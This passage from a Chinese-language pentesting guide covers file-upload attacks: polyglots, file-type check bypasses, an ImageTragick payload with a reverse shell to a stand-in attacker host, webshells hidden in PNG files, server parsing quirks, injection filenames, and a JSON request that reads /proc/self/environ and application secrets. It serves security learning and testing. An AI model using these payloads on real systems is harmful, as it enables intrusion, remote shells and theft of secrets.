尽管适应性强，polyglots 也有其局限。例如，尽管一个 polyglot 可能同时兼具 `PHAR file` (`PHp ARchive`) 和 `JPEG` 的特性，其能否被接受上传可能取决于平台对文件扩展名的策略。如果系统对允许的扩展名有严格控制，polyglot 的结构双重性本身可能不足以保证上传成功。

More information in: https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a

---

### 5. 像上传 PDF 一样上传有效的 JSON

如何通过伪造 PDF 来上传合法的 JSON 文件以规避文件类型检测（技术来自 **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**）：

- **`mmmagic` library**：只要 `%PDF` 魔数出现在前 1024 字节内就视为有效（示例见文章）
- **`pdflib` library**：在 JSON 的某个字段内加入假 PDF 格式，使库认为它是 pdf（示例见文章）
- **`file` binary**：它可以读取文件的前 1048576 字节。只需创建一个大于该大小的 JSON，使其无法将内容解析为 json，然后在 JSON 内部放入真实 PDF 的初始部分，它就会认为这是 PDF

## 0x06 文件处理库漏洞

### 1. ImageTragic

将此内容以图像扩展名上传以利用该漏洞 **(ImageMagick , 7.0.1-1)**（参见 [exploit](https://www.exploit-db.com/exploits/39767)）

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```

---

### 2. 在 PNG 中嵌入 PHP Shell（PHP-GD）

将 PHP shell 嵌入 PNG 文件的 IDAT chunk 中，可以有效绕过某些图像处理操作。来自 PHP-GD 的 `imagecopyresized` 和 `imagecopyresampled` 函数在此情境中特别相关，因为它们分别常用于调整大小和重采样图像。嵌入的 PHP shell 在这些操作下保持不受影响的能力，对某些用例是重要优势。

关于该技术的详尽探讨（包括方法论和潜在应用）见下文文章：[“Encoding Web Shells in PNG IDAT chunks”](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)。该资源提供了对过程及其影响的全面理解。

More information in: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

---

## 0x07 中间件解析特性技巧

---

### 1. Apahce

- **Apache HTTPD 换行解析漏洞 (CVE-2017-15715)**

  - 影响版本： 2.4.0~2.4.29

  - 说明：在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析。上传并访问/1.php%0a，发现能够成功解析，但是这个文件的后缀不是php后缀，说明目标存在解析漏洞。


- **Apache HTTPD 多后缀解析**

  - 影响版本： 全部

  - 说明：Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：`AddType text/html .htmlAddLanguage zh-CN .cn`  
    其给 `.html` 增加了一个 `media-type` ，值为 `text/html;` 给 `.cn` 后缀增加了语言，值为 `zh-CN` 。此时，如果用户请求文件 `index.cn.html` ，它将会返回一个中午的 `html` 页面。以上就是 Apache 多后缀的特性。如果运维人员给 `.php` 后缀增加了处理器： `AddHandler application/x-httpd-php .php`


那么，在有多个后缀的情况下，只要有一个文件含有 `.php` 后缀即将被识别为 PHP 文件，即使最后后缀不是 `.php` 。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。访问上传目录 `/uploads/phpinfo.php.7z` ，即可发现， `phpinfo` 被执行了，该文件被解析为 PHP 脚本。

### 2. Nginx

- **`php-fpm.conf` 文件配置不当导致文件解析漏洞**

  - 影响版本： 全部

  - 说明：`php.ini` 配置文件中 `cgi.fix_pathinfo=1`（默认值：”1”），`php-fpm.conf` 文件中配置存在如下其一，则存在文件解析漏洞

    ```ini
    security.limit_extensions = 
    或
    security.limit_extensions = .php .jpg
    ```


上传 `.png` 文件，通过 `/uploadfiles/nginx.png/.php` 方式访问即可 getshell。

在 `PHP 5.3.9` 之前的版本中， `security.limit_extensions` 的默认值是空字符串，即不限制 PHP 脚本的扩展名。在 `PHP 5.3.9` 及之后的版本中， `security.limit_extensions` 的默认值是 `.php .phar` ，只允许执行扩展名为 `.php` 和 `.phar` 的文件。

注：修改了后需要 `service php-fpm restart` 重启 PHP。

---

### 3. IIS

- **IIS 7.5 CGI 配置错误问题**

  - 影响版本： 7.5

  - 说明：
    - Fast-CGI 运行模式
    - php.ini 配置文件： `cgi.fix_pathinfo=1`
    - 取消勾选 `php-cgi.exe` 程序的 `invoke handler only if request is mapped to` 。也就是取消勾选模块映射中的请求限制。
    - 在上传的文件名后面加上 `/.php`，即可被作为 PHP 文件解析。


- **IIS 6.0 解析漏洞**

  - 影响版本： 6.0

  - 说明：
    - 在 `.asp` 、`.asa` 目录下的任意文件都会以 `asp` 格式解析文件解析。
    - WebDAV 功能开启后，`evil.asp;.jpg` 将会被解析成为 .asp 脚本，原因是 IIS 6.0 的 WebDAV 实现中存在一个缺陷，即如果请求的 URL 包含分号，那么 IIS 6.0 会将分号后面的内容当做参数进行解析，而不是将其作为路径的一部分。攻击者可以通过构造带有分号的 URL 来绕过文件扩展名的限制，。
    - IIS 6.0 默认的可执行文件除了 `asp` 还包含 `asa 、cer 、cdx` ，会将这三种扩展名文件解析为 asp 文件。

## 0x08 从文件上传到其他漏洞

- filename 设置为 `../../../tmp/lol.png` ，尝试目录径遍历攻击。

- filename 设置为 `sleep(10)--.jpg`，尝试 SQL 注入攻击

- filename 设置为 `<svg onload=alert(document.domain)>` 尝试 XSS 攻击

- filename 设置为 `;sleep 10;` 尝试命令注入（更多详见：[命令注入技巧](https://book.hacktricks.xyz/pentesting-web/command-injection)）

- 上传 svg 文件，进行 XSS 攻击，详见 [svg-xss 技巧](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#xss-uploading-files-svg#svg-file-upload)

- 上传 svg 文件，进行 XXE 攻击，详见 [svg-xxe 技巧](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#svg-file-upload#svg-file-upload)

- 上传 svg 文件，进行重定向攻击，详见 [svg-Open Redirect 技巧](https://book.hacktricks.xyz/pentesting-web/open-redirect#open-redirect-uploading-svg-files)

- 更多 svg 相关攻击技巧，详见：[svg-cheatsheet](https://github.com/allanlw/svg-cheatsheet)

- 上传 JS 文件，进行 [XSS 攻击](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#xss-abusing-service-workers)

- ImageTrick 漏洞

- 如果能够指示 Web 服务器从 URL 获取图像，可以尝试 SSRF 攻击。如果图片保存在公共页面上，则可以通过以下 URL 地址 `https://iplogger.org/invisible/` 窃取每个访问者的信息。 [iplogger.org 使用指南](https://www.potatomedia.co/post/4fee0735-90ea-46bc-8739-4626c7cc008e)。

- 通过上传 PDF-Adobe，进行 XXE 和 CORS 攻击, 详见 [PDF-Adobe-XXE&CORS 技巧](https://book.hacktricks.xyz/pentesting-web/file-upload/pdf-upload-xxe-and-cors-bypass)

- 从定制 PDF 到 XSS：如果您可以上传 PDF，您可以准备一些 PDF，这些 PDF 将按照给定的指示执行任意 JS。详见[如何注入 PDF 数据以获取 JS 执行](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/pdf-injection)。

- 上传 [eicar](https://secure.eicar.org/eicar.com.txt) 内容查看服务器是否有杀毒软件

- 检查上传文件是否有大小限制，DOS？Crash？

- Content-Type 混淆导致任意文件读取

  - 一些上传处理器会**信任已解析的请求体**（例如 `context.getBodyData().files`），随后在未先强制要求 `Content-Type: multipart/form-data` 的情况下就**从 `file.filepath` 复制文件**。如果服务器接受 `application/json`，你可以提供一个伪造的 `files` 对象，将 `filepath` 指向**任何本地路径**，从而把上传流程变成任意文件读取原语。

    下面是针对一个表单工作流的示例 POST，会在 HTTP 响应中返回上传的二进制：

    ```http
    POST /form/vulnerable-form HTTP/1.1
    Host: target
    Content-Type: application/json
    
    {
        "files": {
            "document": {
                "filepath": "/proc/self/environ",
                "mimetype": "image/png",
                "originalFilename": "x.png"
            }
        }
    }
    
    ```

  - 后端复制了 `file.filepath`，因此响应返回该路径的内容。常见链：读取 `/proc/self/environ` 以获取 `$HOME`，然后读取 `$HOME/.n8n/config` 获取密钥，以及 `$HOME/.n8n/database.sqlite` 获取用户标识符。


上传功能 TOP 10 攻击思路 (From [Link](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI(FFmpeg LFI) / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS) 
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

---

## 0x09 参考

- [https://book.hacktricks.xyz/pentesting-web/file-upload](https://book.hacktricks.xyz/pentesting-web/file-upload)

  - [n8n form upload Content-Type confusion → arbitrary file read PoC](https://github.com/Chocapikk/CVE-2026-21858)

  - [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

  - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload insecure files)

  - https://github.com/modzero/mod0BurpUploadScanner

  - https://github.com/almandin/fuxploider

  - https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html

  - https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

  - https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a

  - https://blog.doyensec.com/2025/01/09/cspt-file-upload.html

  - [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)

  - [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

  - [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)

  - [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

  - [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)

  - [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)

  - [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

  - [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

  - [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

  - [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

  - [When Audits Fail: From Pre-Auth SSRF to RCE in TRUfusion Enterprise](https://www.rcesecurity.com/2026/02/when-audits-fail-from-pre-auth-ssrf-to-rce-in-trufusion-enterprise/)

- [https://cloud.tencent.com/developer/article/1944142](https://cloud.tencent.com/developer/article/1944142)